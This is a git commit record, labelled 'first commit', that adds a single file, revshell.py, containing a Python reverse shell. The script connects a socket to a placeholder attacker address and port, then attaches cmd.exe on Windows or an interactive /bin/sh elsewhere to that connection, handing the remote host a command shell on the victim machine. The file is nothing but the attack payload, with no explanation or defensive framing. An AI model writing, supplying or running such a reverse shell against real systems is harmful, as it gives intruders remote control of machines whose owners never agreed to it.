2ebd802ee7893d2026e5afd4777f1ac3e960addd
Maxwell kioko <127490651+Macgyver02@users.noreply.github.com>
2024-11-11 17:35:39 +0900

    first commit

---
+++ revshell.py
@@ -0,0 +1,12 @@
+import socket, subprocess, os
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect(("attacker_ip", attacker_port))
+
+if os.name == 'nt':
+
+    subprocess.call(["cmd.exe"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
+
+else:
+    subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
